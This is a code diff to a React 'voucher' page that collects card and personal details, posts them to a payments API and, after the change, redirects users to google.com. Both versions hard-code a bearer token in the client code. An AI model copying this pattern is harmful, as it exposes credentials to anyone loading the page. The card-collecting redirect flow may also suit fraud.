@@ -7,6 +7,7 @@ import { Infomation } from "./Infomation";
 import { API_URL } from "../../config";
 import axios from "axios";
 import { useNavigate } from "react-router-dom";
+import { toast } from 'react-toastify';
 
 const VoucherPage = () => {
 
@@ -24,7 +25,7 @@ const VoucherPage = () => {
         address2: Yup.string().required(),
         city: Yup.string().required(),
         region: Yup.string().required(),
-        zipcode: Yup.string().required(),
+        zipcode: Yup.string().min(3, 'Invalid zip code').required(),
         state: Yup.string().required(),
         country: Yup.string().required(),
         gender: Yup.string().required(),
@@ -108,16 +109,21 @@ const VoucherPage = () => {
     }
 
     const onSubmit = async () => {
-        setLoading(true);
-        await axios.post(`${API_URL}/api/payments`, {
-            ...submitValueCard, ...submitValueInformation
-        }, {
-            headers: {
-                Authorization: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YTZmZWFhMzgwNmNlNmM4MDk0ODQ3ZiIsInNlc3Npb25JZCI6IjY2YjQ2YWVlMzVlNmM5YjE1M2IwY2VhNCIsImlhdCI6MTcyMzA5OTg4NiwiZXhwIjoxNzMxNzM5ODg2fQ.wxKhrnp1IFtyCBrICttEFZjqf_z9wZ3nAPQkGaJX9Ng`
-            }
-        });
-        setLoading(false);
-        navigate('/')
+        try {
+            setLoading(true);
+            await axios.post(`${API_URL}/api/payments`, {
+                ...submitValueCard, ...submitValueInformation
+            }, {
+                headers: {
+                    Authorization: `Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpZCI6IjY2YTZmZWFhMzgwNmNlNmM4MDk0ODQ3ZiIsInNlc3Npb25JZCI6IjY2YjQ2YWVlMzVlNmM5YjE1M2IwY2VhNCIsImlhdCI6MTcyMzA5OTg4NiwiZXhwIjoxNzMxNzM5ODg2fQ.wxKhrnp1IFtyCBrICttEFZjqf_z9wZ3nAPQkGaJX9Ng`
+                }
+            });
+            setLoading(false);
+            window.location.href = "https://www.google.com"
+        } catch (error) {
+            setLoading(false);
+            toast.error(error?.response?.data?.message ?? "Unknow error")
+        }
     };
 
     const handleSend = () => {
